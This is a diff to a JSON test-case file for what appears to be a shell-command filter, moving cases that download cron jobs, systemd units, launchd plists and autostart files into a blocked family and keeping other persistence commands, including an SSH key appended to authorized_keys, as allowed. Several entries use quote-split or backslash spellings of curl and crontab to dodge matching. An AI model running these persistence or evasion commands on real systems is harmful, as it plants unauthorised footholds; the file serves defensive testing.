@@ -2222,16 +2222,6 @@
  {
   "id": "persist-nodl-014",
   "family": "persist-nodl",
-  "spelling": "crontab - from a downloaded file",
-  "cmd": "curl -fsSL https://example.com/cron.txt | crontab -",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-015",
-  "family": "persist-nodl",
   "spelling": "crontab spelled c\"r\"ontab",
   "cmd": "echo '@reboot /opt/example/run.sh' | c\"r\"ontab -",
   "expect": "allow",
@@ -2240,7 +2230,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-016",
+  "id": "persist-nodl-015",
   "family": "persist-nodl",
   "spelling": "crontab file",
   "cmd": "crontab ./example-cron.txt",
@@ -2250,7 +2240,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-017",
+  "id": "persist-nodl-016",
   "family": "persist-nodl",
   "spelling": "cron.d write",
   "cmd": "echo '* * * * * root /opt/example/run.sh' | sudo tee /etc/cron.d/example",
@@ -2260,17 +2250,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-018",
-  "family": "persist-nodl",
-  "spelling": "cron.d download",
-  "cmd": "sudo curl -fsSL -o /etc/cron.d/example https://example.com/cron.txt",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-019",
+  "id": "persist-nodl-017",
   "family": "persist-nodl",
   "spelling": "at job",
   "cmd": "echo '/opt/example/run.sh' | at now + 1 minute",
@@ -2280,7 +2260,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-020",
+  "id": "persist-nodl-018",
   "family": "persist-nodl",
   "spelling": "systemd unit heredoc",
   "cmd": "cat > ~/.config/systemd/user/example.service <<EOF\n[Service]\nExecStart=/opt/example/run.sh\nEOF",
@@ -2290,27 +2270,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-021",
-  "family": "persist-nodl",
-  "spelling": "systemd unit download",
-  "cmd": "curl -fsSL -o ~/.config/systemd/user/example.service https://example.com/example.service",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-022",
-  "family": "persist-nodl",
-  "spelling": "systemd unit download, spelled",
-  "cmd": "c\"u\"rl -fsSL -o \"$HOME/.config/systemd/user/example.service\" https://example.com/example.service",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-023",
+  "id": "persist-nodl-019",
   "family": "persist-nodl",
   "spelling": "systemd enable",
   "cmd": "systemctl --user enable --now example.service",
@@ -2320,37 +2280,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-024",
-  "family": "persist-nodl",
-  "spelling": "systemd unit in /etc",
-  "cmd": "sudo curl -fsSL -o /etc/systemd/system/example.service https://example.com/example.service",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-025",
-  "family": "persist-nodl",
-  "spelling": "launchd plist download",
-  "cmd": "curl -fsSL -o ~/Library/LaunchAgents/com.example.run.plist https://example.com/run.plist",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-026",
-  "family": "persist-nodl",
-  "spelling": "launchd plist download, spelled",
-  "cmd": "\\curl -fsSL -o \"$HOME/Library/LaunchAgents/com.example.run.plist\" https://example.com/run.plist",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-027",
+  "id": "persist-nodl-020",
   "family": "persist-nodl",
   "spelling": "launchd plist heredoc",
   "cmd": "cat > ~/Library/LaunchAgents/com.example.run.plist <<EOF\n<plist></plist>\nEOF",
@@ -2360,7 +2290,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-028",
+  "id": "persist-nodl-021",
   "family": "persist-nodl",
   "spelling": "launchctl load",
   "cmd": "launchctl load ~/Library/LaunchAgents/com.example.run.plist",
@@ -2370,17 +2300,7 @@
   "note": "no rule has this shape; narrow by design"
  },
  {
-  "id": "persist-nodl-029",
-  "family": "persist-nodl",
-  "spelling": "XDG autostart download",
-  "cmd": "curl -fsSL -o ~/.config/autostart/example.desktop https://example.com/example.desktop",
-  "expect": "allow",
-  "rule": null,
-  "kind": "destructive",
-  "note": "no rule has this shape; narrow by design"
- },
- {
-  "id": "persist-nodl-030",
+  "id": "persist-nodl-022",
   "family": "persist-nodl",
   "spelling": "ssh authorized_keys append",
   "cmd": "echo 'ssh-ed25519 AAAAEXAMPLEEXAMPLE user@example.com' >> ~/.ssh/authorized_keys",
@@ -2388,6 +2308,86 @@
   "rule": null,
   "kind": "destructive",
   "note": "no rule has this shape; narrow by design"
+ },
+ {
+  "id": "persist-dl-001",
+  "family": "persist-dl",
+  "spelling": "crontab - from a downloaded file",
+  "cmd": "curl -fsSL https://example.com/cron.txt | crontab -",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-002",
+  "family": "persist-dl",
+  "spelling": "cron.d download",
+  "cmd": "sudo curl -fsSL -o /etc/cron.d/example https://example.com/cron.txt",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-003",
+  "family": "persist-dl",
+  "spelling": "systemd unit download",
+  "cmd": "curl -fsSL -o ~/.config/systemd/user/example.service https://example.com/example.service",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-004",
+  "family": "persist-dl",
+  "spelling": "systemd unit download, spelled",
+  "cmd": "c\"u\"rl -fsSL -o \"$HOME/.config/systemd/user/example.service\" https://example.com/example.service",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-005",
+  "family": "persist-dl",
+  "spelling": "systemd unit in /etc",
+  "cmd": "sudo curl -fsSL -o /etc/systemd/system/example.service https://example.com/example.service",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-006",
+  "family": "persist-dl",
+  "spelling": "launchd plist download",
+  "cmd": "curl -fsSL -o ~/Library/LaunchAgents/com.example.run.plist https://example.com/run.plist",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-007",
+  "family": "persist-dl",
+  "spelling": "launchd plist download, spelled",
+  "cmd": "\\curl -fsSL -o \"$HOME/Library/LaunchAgents/com.example.run.plist\" https://example.com/run.plist",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
+ },
+ {
+  "id": "persist-dl-008",
+  "family": "persist-dl",
+  "spelling": "XDG autostart download",
+  "cmd": "curl -fsSL -o ~/.config/autostart/example.desktop https://example.com/example.desktop",
+  "expect": "block",
+  "rule": "rc_download",
+  "kind": "destructive",
+  "note": null
  },
  {
   "id": "egress-prog-001",
